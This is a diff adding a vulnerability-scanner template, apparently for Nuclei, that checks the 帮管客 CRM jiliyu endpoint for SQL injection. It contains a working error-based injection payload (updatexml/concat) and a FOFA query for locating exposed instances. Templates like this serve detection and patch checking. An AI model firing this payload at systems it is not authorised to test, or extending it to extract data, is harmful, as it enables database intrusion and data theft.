@@ -1,0 +1,27 @@
+id: bangguan-crm-jiliyu-sqli
+
+info:
+  name: "帮管客 CRM 系统 jiliyu 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="帮管客-CRM"
+        帮管客CRM是一款基于互联网的客户关系管理软件，主要功能涵盖客户关系维护、销售流程优化及营销策略分析。其jiliyu接口因未正确过滤用户输入参数，导致存在SQL注入漏洞。攻击者可构造恶意SQL语句通过报错注入方式获取数据库结构及敏感数据，存在数据泄露风险。
+  tags: 帮管客
+
+http:
+- raw:
+  - |
+    GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=123&xu=and%201=(updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)) HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'a0b923820dcc509a'
